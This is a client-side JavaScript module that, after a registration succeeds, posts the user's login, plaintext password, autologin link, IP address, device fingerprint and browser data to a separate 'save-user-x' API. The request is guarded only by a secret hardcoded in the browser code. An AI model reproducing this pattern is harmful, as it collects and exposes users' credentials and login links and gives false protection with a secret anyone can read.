// js/api/userX.js
import { ENV } from '../const.js';
import { getVisitorId, getBrowserData, getIp } from '../utils/browser.js';

const SECRET_WORD = "79d7683a-3a54-4a73-aea4-b05eba039d22";

export async function saveUserX(regData) {

  if (!regData.success) {
    console.warn("Регистрация не удалась, не сохраняем user-x");
    return;
  }

  const payload = {
    visitorId: await getVisitorId(),
    source: location.href,
    siteUrl: location.href,
    domain: regData.domain,
    login: regData.login?.toString(),
    password: regData.password,
    autologin: regData.autologin,
    custom_login_link: regData.custom_login_link || regData.customLoginLink,
    deposit: regData.deposit,
    main: regData.main,
    success: regData.success,
    clientIp: await getIp(),
    name: regData.name || null,        // если в regData есть имя
    email: regData.email || null,      // если передаётся
    browserData: getBrowserData(),
  };

  try {
    const res = await fetch(`${ENV.userApi}/save-user-x`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Secret-Word": SECRET_WORD,  // ← наш заголовок для защиты
      },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      const errorText = await res.text();
      console.error("Ошибка сохранения user-x:", res.status, errorText);
      return;
    }

    const result = await res.json();
    console.log("User-X успешно сохранён в базе:", result);
  } catch (err) {
    console.error("Не удалось отправить user-x на сервер:", err);
    // Не кидаем ошибку дальше — это не должно ломать основной флоу
  }
}